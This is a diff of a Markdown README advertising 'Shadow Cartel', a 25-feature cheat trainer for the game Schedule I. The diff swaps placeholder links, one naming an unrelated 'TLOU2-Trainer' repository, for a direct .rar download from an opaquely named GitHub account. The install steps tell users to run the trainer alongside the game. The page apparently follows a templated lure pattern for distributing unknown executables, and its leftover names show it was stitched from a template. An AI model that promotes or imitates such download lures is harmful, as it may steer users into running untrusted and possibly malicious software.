@@ -1,6 +1,6 @@
 # Schedule I: Shadow Cartel v1.0 - 25 Masters of Mayhem
 
-**[Download Trainer](https://github.com/yourusername/TLOU2-Trainer/releases)**  
+**[Download Trainer](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Shadow.Cartel.v1.0.-.25.Masters.of.Mayhem.rar)**  
 
 **Meta Description**: Conquer Schedule I with Shadow Cartel v1.0, wielding 25 elite tools. Rule with infinite wealth, unseen steps, and frozen time in Hyland’s chaos of 2025!
 
@@ -53,7 +53,7 @@ Command *Schedule I* with these hotkey-forged weapons:
 
 ## How to Install and Use
 
-1. **Download**: Steal *Shadow Cartel* from the [releases page](https://github.com/yourusername/Schedule-I-Shadow-Cartel/releases).  
+1. **Download**: Steal *Shadow Cartel* from the [releases page](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Shadow.Cartel.v1.0.-.25.Masters.of.Mayhem.rar).  
 2. **Install**: Stash files in the *Schedule I* root folder.  
 3. **Launch**: Ignite *Shadow Cartel* first, then plunge into *Schedule I* (v1.0).  
 4. **Activate**: Press the hotkeys above in-game to run the streets.  
